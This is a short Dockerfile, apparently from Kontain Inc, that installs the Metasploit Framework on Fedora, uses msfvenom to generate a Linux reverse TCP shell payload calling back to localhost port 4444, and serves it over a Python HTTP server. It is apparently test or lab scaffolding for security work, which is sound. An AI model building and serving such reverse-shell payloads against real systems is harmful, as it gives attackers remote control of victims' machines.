#
# Copyright 2021 Kontain Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

FROM fedora
ARG RPM=metasploit-framework-6.1.22%2B20211228112552~1rapid7-1.el6.x86_64.rpm

EXPOSE 8081
ADD $RPM /tmp/
RUN dnf install -y /tmp/$RPM libxcrypt-compat-4.4.26-4.fc35.x86_64
RUN msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
WORKDIR /tmp
ENTRYPOINT [ "python3", "-m", "http.server", "8081" ]
